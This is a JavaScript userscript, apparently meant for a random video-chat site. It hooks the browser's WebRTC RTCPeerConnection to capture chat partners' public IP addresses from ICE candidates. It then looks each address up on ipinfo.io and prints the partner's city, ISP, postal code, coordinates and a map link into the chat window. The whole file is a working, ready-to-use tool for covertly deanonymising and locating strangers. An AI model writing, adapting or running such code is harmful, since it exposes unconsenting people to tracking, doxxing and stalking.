(function() {
    'use strict';
    var apiKey = "api-key-here";
    var regionNames = new Intl.DisplayNames(['en'], { type: 'region' });

    var addMessage = async (html) => {
        var putData = document.getElementsByClassName("message-bubble")[0]?.firstChild;
        if (!putData) return;

        var div = document.createElement("div");
        div.setAttribute("class", "logitem");

        var p = document.createElement("p");
        p.setAttribute("class", "statuslog");
        p.innerHTML = html;

        div.appendChild(p);
        putData.appendChild(div);
    };

    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

    window.RTCPeerConnection = function (...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function (iceCandidate, ...rest) {
            if (!iceCandidate || !iceCandidate.candidate) 
                return pc.oaddIceCandidate(iceCandidate, ...rest);

            const fields = iceCandidate.candidate.split(" ");
            const ip = fields[4];
            if (fields[7] === "srflx") {
                getLocation(ip);
            }

            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };

        return pc;
    };

    var getLocation = async (ip) => {
        try {
            let url = `https://ipinfo.io/${ip}?token=${apiKey}`;
            let response = await fetch(url);
            let json = await response.json();

            const [lat, lon] = json.loc.split(",");
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

            const output = `
--------------------------<br>
<b>IP</b> : ${json.ip}<br>
<b>Country</b> : ${regionNames.of(json.country)}<br>
<b>State</b> : ${json.region}<br>
<b>City</b> : ${json.city}<br>
<b>ISP</b> : ${json.org}<br>
<b>Postal Code</b> : ${json.postal}<br>
<b>Lat / Long</b> : ${json.loc}<br>
<b>View On Map</b> : <a href="${mapLink}" target="_blank" style="color:#4ea3ff;">Open Google Maps</a><br>
--------------------------
`;

            addMessage(output);

        } catch (err) {
            console.error("Error getting location:", err);
        }
    };
})();
